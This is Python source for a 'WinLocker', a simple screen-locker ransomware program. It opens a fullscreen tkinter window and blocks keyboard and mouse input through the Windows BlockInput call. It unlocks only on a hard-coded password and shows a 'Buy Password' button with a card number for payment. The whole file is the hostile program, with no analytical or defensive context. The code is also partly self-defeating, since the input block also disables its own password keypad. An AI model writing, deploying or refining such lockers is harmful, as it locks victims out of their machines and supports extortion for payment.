import tkinter as tk
from tkinter import messagebox
import ctypes

def block_keyboard():
    ctypes.windll.user32.BlockInput(True)

def unblock_keyboard():
    ctypes.windll.user32.BlockInput(False)

root = tk.Tk()
root.attributes("-fullscreen", True)
root.configure(bg="dark green")
root.title("WinLocker")

PASSWORD = "1234"

def on_password_input():
    entered_password = password_var.get()
    if entered_password == PASSWORD:
        messagebox.showinfo("Success", "Access Granted!")
        unblock_keyboard()
        root.destroy()
    else:
        messagebox.showerror("Error", "Incorrect Password!")

def show_card_number():
    messagebox.showinfo("Buy Password", "Card Number: 123132")

password_var = tk.StringVar()
password_entry = tk.Entry(root, textvariable=password_var, show="*", font=("Arial", 24), justify="center")
password_entry.place(relx=0.5, rely=0.4, anchor="center")

digits = "1234567890"
button_frame = tk.Frame(root, bg="dark green")
button_frame.place(relx=0.5, rely=0.6, anchor="center")

for i, digit in enumerate(digits):
    btn = tk.Button(button_frame, text=digit, font=("Arial", 18), width=4, height=2,
                    command=lambda d=digit: password_var.set(password_var.get() + d))
    btn.grid(row=i // 3, column=i % 3, padx=5, pady=5)

submit_btn = tk.Button(root, text="Submit", font=("Arial", 18), command=on_password_input)
submit_btn.place(relx=0.5, rely=0.8, anchor="center")

buy_btn = tk.Button(root, text="Buy Password", font=("Arial", 18), command=show_card_number)
buy_btn.place(relx=0.5, rely=0.9, anchor="center")

root.after(1000, block_keyboard)

root.mainloop()
